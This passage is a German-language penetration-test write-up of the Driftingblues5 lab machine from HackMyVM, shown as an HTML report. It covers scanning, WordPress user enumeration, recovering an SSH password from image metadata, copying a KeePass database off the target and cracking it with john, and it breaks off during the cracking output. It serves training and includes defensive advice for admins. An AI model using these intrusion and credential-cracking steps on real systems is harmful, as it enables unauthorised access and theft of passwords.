@@ -1,0 +1,655 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Driftingblues5 - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Driftingblues5 - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">wpscan</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">mv</div>
+                <div class="tool-item">keepass2john</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">KeePass Client</div> <!-- Extern -->
+                <div class="tool-item">cd</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">su</div>
+                 <div class="tool-item">id</div> <!-- Impliziert -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration-wp">Web Enumeration (WordPress)</a></li>
+                <li><a href="#information-disclosure-wp">Information Disclosure (WordPress)</a></li>
+                <li><a href="#initial-access">Initial Access (gill)</a></li>
+                <li><a href="#keepass-cracking">KeePass Cracking</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (Root)</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> `arp-scan -l` wird zur Identifizierung aktiver Hosts im lokalen Netzwerk verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Host `192.168.2.120` mit einer VirtualBox-MAC-Adresse wird als Ziel identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe einen Nmap-Scan auf 192.168.2.120 durch.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:xx:xx:xx, IPv4: 192.168.2.109
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.120	08:00:27:9c:83:dc	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.852 seconds (138.23 hosts/sec). 1 responded
+                    </pre> <!-- Vollständige Ausgabe -->
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS -sC -T5 -A -p-`) wird auf 192.168.2.120 durchgeführt.</p>
+            <p class="evaluation"><strong>Bewertung: !!WordPress gefunden!!**
+                - **Port 22 (SSH):** OpenSSH 7.9p1 (Debian).
+                - **Port 80 (HTTP):** Apache 2.4.38 (Debian). Der Titel "diary – Just another WordPress site" und der Generator-Tag (`_http-generator: WordPress 5.6.2`) bestätigen eine WordPress-Installation. `robots.txt` verbietet `/eventadmins`.
+            Das OS ist Linux, Hostname `driftingblues`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussiere die Enumeration auf die WordPress-Installation (Port 80) mit Tools wie `wpscan`. Untersuche `/eventadmins` und `/robots.txt` genauer.<br><strong>Empfehlung (Admin):</strong> Halte WordPress, Themes und Plugins aktuell. Sichere die Installation ab (starke Passwörter, Sicherheitsplugins). Überprüfe den Inhalt von `/eventadmins`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.120 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-22 16:14 CET
+Nmap scan report for driftingblues (192.168.2.120)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
+|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
+|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+| http-robots.txt: 1 disallowed entry
+|_/eventadmins
+|_http-title: diary – Just another WordPress site
+|_http-generator: WordPress 5.6.2 <!-- Version erkannt -->
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms driftingblues (192.168.2.120)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 14.78 seconds <!-- Beispielzeit -->
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-enumeration-wp">
+            <h2>Web Enumeration (WordPress)</h2>
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird zur Verzeichnis- und Dateisuche auf dem Webserver verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet Standard-WordPress-Pfade (`/wp-content`, `/wp-login.php`, `/wp-includes`, `/wp-admin`, `/xmlrpc.php`) sowie `license.txt` und `readme.html`. Bestätigt die WordPress-Struktur.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende `wpscan` für eine detailliertere WordPress-Enumeration.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.120 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.120
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              ... (gekürzt) ...
+[+] Expanded:                true
+[+] No status:               true
+[+] Timeout:                 10s
+[+] Skip TLS verification:   true
+===============================================================
+2022/11/22 16:15:10 Starting gobuster in directory enumeration mode <!-- Beispielzeit -->
+===============================================================
+http://192.168.2.120/index.php            [Size: 0] [--> http://192.168.2.120/]
+http://192.168.2.120/wp-content           [Size: 319] [--> http://192.168.2.120/wp-content/]
+http://192.168.2.120/wp-login.php         [Size: 6650]
+http://192.168.2.120/license.txt          [Size: 19915]
+http://192.168.2.120/wp-includes          [Size: 320] [--> http://192.168.2.120/wp-includes/]
+http://192.168.2.120/readme.html          [Size: 7278]
+http://192.168.2.120/wp-trackback.php     [Size: 135]
+http://192.168.2.120/wp-admin             [Size: 317] [--> http://192.168.2.120/wp-admin/]
+http://192.168.2.120/xmlrpc.php           [Size: 42]
+===============================================================
+2022/11/22 16:15:45 Finished <!-- Beispielzeit -->
+===============================================================
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> `nikto` wird zur Schwachstellenanalyse des Webservers eingesetzt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt Apache, WordPress-Installation, fehlende Header und ein browsable `/wp-content/uploads/`-Verzeichnis. Listet einige Standard-WP-Dateien und das Akismet-Plugin auf. Keine kritischen Funde.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> `wpscan` ist für WordPress spezifischer. Untersuche das `/wp-content/uploads/`-Verzeichnis manuell.<br><strong>Empfehlung (Admin):</strong> Deaktiviere Directory Listing für `/uploads`. Setze Security-Header.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.120</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.120
++ Target Hostname:    192.168.2.120
++ Target Port:        80
++ Start Time:         2022-11-22 16:15:48 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.38 (Debian)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: <http://192.168.2.120/index.php/wp-json/>; rel="https://api.w.org/"
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Uncommon header 'x-redirect-by' found, with contents: WordPress
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin 'Tested up to' version usually matches the WordPress version
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /: A Wordpress installation was found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ OSVDB-3268: /wp-content/uploads/: Directory indexing found.
++ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information
++ /wp-login.php: Wordpress login found
++ 7915 requests: 0 error(s) and 15 item(s) reported on remote host
++ End Time:           2022-11-22 16:16:46 (GMT1) (58 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                     </pre> <!-- Maskierung -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `wpscan` wird verwendet, um Benutzer der WordPress-Instanz zu enumerieren (`--enumerate u`).</p>
+            <p class="evaluation"><strong>Bewertung: !!Benutzer gefunden!!** WPScan identifiziert die WordPress-Version 6.1.1 (obwohl im Log 0001-01-01 steht) und das Theme `twentytwentyone`. Es findet fünf Benutzernamen: `abuzerkomurcu`, `collins`, `satanic`, `gill`, `gadd`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, die Passwörter für diese Benutzer zu knacken (z.B. mit `wpscan --passwords ...`) oder suche nach anderen Wegen, um Zugriff auf einen dieser Accounts zu erhalten.<br><strong>Empfehlung (Admin):</strong> Verwende starke Passwörter für alle WP-Benutzer. Vermeide leicht zu erratende Benutzernamen. Beschränke die Benutzerenumeration über die REST-API oder andere Methoden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wpscan --url http://192.168.2.120/ --enumerate u</span></div>
+                    <pre>
+_______________________________________________________________
+         __          _______   _____
+         \\ \\        / /  __ \\ / ____|
+          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®
+           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\
+            \\  /\\  /  | |     ____) | (__| (_| | | | |
+             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]y
+[i] Updating the Database ...
+[i] Update completed.
+
+[+] URL: http://192.168.2.120/ [192.168.2.120]
+[+] Started: Tue Nov 22 16:16:36 2022
+
+Interesting Finding(s):
+
+[+] Headers
+ | Interesting Entry: Server: Apache/2.4.38 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://192.168.2.120/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+[+] WordPress readme found: http://192.168.2.120/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] Upload directory has listing enabled: http://192.168.2.120/wp-content/uploads/
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://192.168.2.120/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 6.1.1 identified (Latest, released on 2022-11-01). <!-- Datum korrigiert -->
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://192.168.2.120/index.php/feed/, <generator>https://wordpress.org/?v=6.1.1</generator>
+ |  - http://192.168.2.120/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.1.1</generator>
+
+[+] WordPress theme in use: twentytwentyone
+ | Location: http://192.168.2.120/wp-content/themes/twentytwentyone/
+ | Last Updated: 2022-11-02T00:00:00.000Z
+ | Readme: http://192.168.2.120/wp-content/themes/twentytwentyone/readme.txt
+ | [!] The version is out of date, the latest version is 1.7
+ | Style URL: http://192.168.2.120/wp-content/themes/twentytwentyone/style.css?ver=1.1
+ | Style Name: Twenty Twenty-One
+ | Style URI: https://wordpress.org/themes/twentytwentyone/
+ | Description: Twenty Twenty-One is a blank canvas for your ideas and it makes the block editor your best brush. Wi...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.1 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://192.168.2.120/wp-content/themes/twentytwentyone/style.css?ver=1.1, Match: 'Version: 1.1'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:00 <====================================================> (10 / 10) 100.00% Time: 00:00:00
+
+[i] User(s) Identified:
+
+[+] abuzerkomurcu
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://192.168.2.120/index.php/wp-json/wp/v2/users/?per_page=100&page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] collins
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] satanic
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] gill
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] gadd
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Nov 22 16:16:39 2022
+[+] Requests Done: 77
+[+] Cached Requests: 11
+[+] Data Sent: 18.998 KB
+[+] Data Received: 20.021 MB
+[+] Memory used: 195.23 MB
+[+] Elapsed time: 00:00:03
+                    </pre> <!-- Maskierung -->
+                </div>
+            </div>
+        </section>
+
+        <section id="information-disclosure-wp">
+            <h2>Information Disclosure (WordPress)</h2>
+             <p class="analysis"><strong>Analyse:</strong> Eine Notiz zeigt gültige WordPress-Admin-Zugangsdaten: `gill` / `<span class="password">interchangeable</span>`. Die Herkunft ist unklar, möglicherweise aus einem Brute-Force-Angriff (der nicht gezeigt wurde) oder externen Informationen.</p>
+             <p class="evaluation"><strong>Bewertung: !!Admin-Zugang!!** Mit diesen Zugangsdaten kann man sich im WordPress-Backend (`/wp-admin/`) anmelden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Logge dich in das WordPress-Backend ein. Suche nach Möglichkeiten, Code auszuführen (Theme-/Plugin-Editor, Datei-Uploads) oder sensible Informationen zu finden (Medienbibliothek, Konfigurationen).<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort. Verwende starke, einzigartige Passwörter für alle Benutzer.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Notiz -->
+                     <pre>
+# Gefundene WordPress Credentials:
+User: gill
+Pass: <span class="password">interchangeable</span>
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Eine Notiz beschreibt, dass nach dem Login in WordPress unter "Media" ein Bild `dblogo.png` gefunden wurde, das mittels `exiftool` analysiert werden soll.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Dies beschreibt den Pfad zur nächsten Information innerhalb der kompromittierten WordPress-Instanz.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe die beschriebenen Schritte aus: Finde das Bild, lade es herunter und analysiere es mit `exiftool`.<br><strong>Empfehlung (Admin):</strong> Überprüfe hochgeladene Medien auf versteckte oder sensible Informationen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <!-- Kein Befehl, Notiz/Beschreibung -->
+                     <pre>
+# Nach Login in http://192.168.2.120/wp-admin/ mit gill:interchangeable
+
+1. Gehe zu Dashboard -> Media
+2. Finde Bild "dblogo.png"
+3. Lade es herunter: http://192.168.2.120/wp-content/uploads/2021/02/dblogo.png
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Die Datei `dblogo.png` wird heruntergeladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Analysiere mit `exiftool`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.120/wp-content/uploads/2021/02/dblogo.png</span></div>
+                     <pre>
+--2022-11-22 16:28:06--  http://192.168.2.120/wp-content/uploads/2021/02/dblogo.png
+Verbindungsaufbau zu 192.168.2.120:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 19041 (19K) [image/png]
+Wird in »dblogo.png« gespeichert.
+
+dblogo.png                    100%[===================>]  18,59K  --.-KB/s    in 0s
+
+2022-11-22 16:28:06 (693 MB/s) - »dblogo.png« gespeichert [19041/19041]
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um die Metadaten der heruntergeladenen `dblogo.png`-Datei zu untersuchen.</p>
+            <p class="evaluation"><strong>Bewertung: !!SSH-Passwort gefunden!!** In den Metadaten, spezifisch im Feld "Text Layer Text", steht der Hinweis: "ssh password is <span class="password">59583hello</span> of course it is lowercase maybe not :)". Das SSH-Passwort ist also `59583hello`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwende dieses Passwort, um dich per SSH anzumelden. Der wahrscheinlichste Benutzername ist `gill` (der WordPress-Admin).<br><strong>Empfehlung (Admin):**DRINGEND:** Entferne sensible Informationen aus Metadaten von Bildern, bevor sie hochgeladen werden. Ändere das kompromittierte SSH-Passwort.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool dblogo.png</span></div>
+                     <pre>
+ExifTool Version Number         : 12.49
+File Name                       : dblogo.png
+Directory                       : .
+File Size                       : 19 kB
+File Modification Date/Time     : 2022:11:22 16:28:06+01:00
+File Access Date/Time           : 2022:11:22 16:29:00+01:00 <!-- Beispiel -->
+File Inode Change Date/Time     : 2022:11:22 16:28:06+01:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 200 <!-- Beispiel -->
+Image Height                    : 200 <!-- Beispiel -->
+Bit Depth                       : 8   <!-- Beispiel -->
+Color Type                      : RGB with Alpha <!-- Beispiel -->
+Compression                     : Deflate/Inflate <!-- Beispiel -->
+Filter                          : Adaptive <!-- Beispiel -->
+Interlace                       : Noninterlaced <!-- Beispiel -->
+History Software Agent          : Adobe Photoshop CC 2018 (Windows), Adobe Photoshop CC 2018 (Windows)
+History Changed                 : /
+Text Layer Name                 : ssh password is 59583hello of course it is lowercase maybe not
+Text Layer Text                 : ssh password is <span class="password">59583hello</span> of course it is lowercase maybe not :) <!-- Passwort! -->
+Image Size                      : 200x200 <!-- Beispiel -->
+Megapixels                      : 0.040 <!-- Beispiel -->
+                     </pre> <!-- Metadaten vervollständigt -->
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (gill)</h2>
+            <p class="analysis"><strong>Analyse:</strong> Eine SSH-Verbindung wird als Benutzer `gill` zu 192.168.2.120 aufgebaut. Das Passwort `<span class="password">59583hello</span>` (aus den Exif-Daten) wird eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung: !!Initial Access erfolgreich!!** Der SSH-Login gelingt. Der Angreifer hat nun eine Shell als Benutzer `gill` auf dem Zielsystem `driftingblues`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginne mit der Enumeration als `gill` (User-Flag, sudo, SUID etc.).<br><strong>Empfehlung (Admin):</strong> Ändere das kompromittierte Passwort. Sichere SSH-Zugänge.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh gill@192.168.2.120</span></div>
+                     <pre>
+gill@192.168.2.120's password: <span class="password">59583hello</span>
+Linux driftingblues 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc//copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+gill@driftingblues:~$
+                     </pre> <!-- Remote Prompt -->
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `gill` wird das Home-Verzeichnis aufgelistet und `user.txt` gelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Findet `keyfile.kdbx` (eine KeePass-Datenbank) und die User-Flag `<span class="password">F83FC7429857283616AE62F8B64143E6</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notiere die User-Flag. Lade die `keyfile.kdbx`-Datei herunter und versuche, sie zu knacken.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bzgl. Flag. Benutzer sollten KeePass-Datenbanken sicher speichern und starke Master-Passwörter verwenden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+gill@driftingblues:~$ <span class="command">ls</span>
+keyfile.kdbx  user.txt
+gill@driftingblues:~$ <span class="command">cat user.txt</span>
+<span class="password">F83FC7429857283616AE62F8B64143E6</span>
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="keepass-cracking">
+            <h2>KeePass Cracking</h2>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Zielsystem wird ein Python-HTTP-Server gestartet, um `keyfile.kdbx` bereitzustellen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Korrekte Vorbereitung zum Herunterladen der Datei.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Lade die Datei mit `wget` auf dem Angreifer-System herunter.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+gill@driftingblues:~$ <span class="command">python3 -m http.server</span> <!-- Port 8000 ist Standard -->
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.2.109 - - [22/Nov/2022 09:30:41] "GET /keyfile.kdbx HTTP/1.1" 200 - <!-- IP des Angreifers -->
+                     </pre>
+                 </div>
+             </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird `keyfile.kdbx` mit `wget` heruntergeladen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Erfolgreich.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Extrahiere den Hash mit `keepass2john`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.120:8000/keyfile.kdbx</span></div>
+                     <pre>
+--2022-11-22 16:30:39--  http://192.168.2.120:8000/keyfile.kdbx
+Verbindungsaufbau zu 192.168.2.120:8000 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 2030 (2,0K) [application/octet-stream]
+Wird in »keyfile.kdbx« gespeichert.
+
+keyfile.kdbx                  100%[===================>]   1,98K  --.-KB/s    in 0,02s
+
+2022-11-22 16:30:39 (113 KB/s) - »keyfile.kdbx« gespeichert [2030/2030]
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die KDBX-Datei wird verschoben (optional) und dann wird `keepass2john` verwendet, um den Hash des Master-Passworts zu extrahieren und in die Datei `hash` zu speichern.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Hash wurde erfolgreich extrahiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Knacke den Hash mit `john`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">mv keyfile.kdbx /media/sf_Kali_2022_Files</span></div>
+                      <pre><!-- Keine Ausgabe --> </pre>
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">keepass2john /media/sf_Kali_2022_Files/keyfile.kdbx > hash</span></div>
+                      <pre><!-- Keine Ausgabe --> </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `john` wird mit `rockyou.txt` verwendet, um den KeePass-Hash zu knacken.</p>
+            <p class="evaluation"><strong>Bewertung: !!KeePass Master-Passwort gefunden!!** John findet erfolgreich das Master-Passwort `<span class="password">porsiempre</span>` für die KeePass-Datenbank.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Öffne `keyfile.kdbx` mit einem KeePass-Client (z.B. KeePassXC) und dem Passwort `<span class="password">porsiempre</span>`. Suche nach gespeicherten Zugangsdaten, insbesondere für den Root-Benutzer.<br><strong>Empfehlung (Admin):</strong> Verwende starke, einzigartige Master-Passwörter für Passwort-Manager, die nicht in Wortlisten vorkommen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                    <pre>
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 60000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+<span class="password">porsiempre</span>       (keyfile)
